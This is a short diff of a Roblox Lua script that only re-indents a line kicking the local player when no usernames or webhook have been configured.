@@ -16,7 +16,7 @@ local Players = game:GetService("Players")
 local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add username or webhook")
+  plr:kick("You didn't add username or webhook")
     return
 end
 
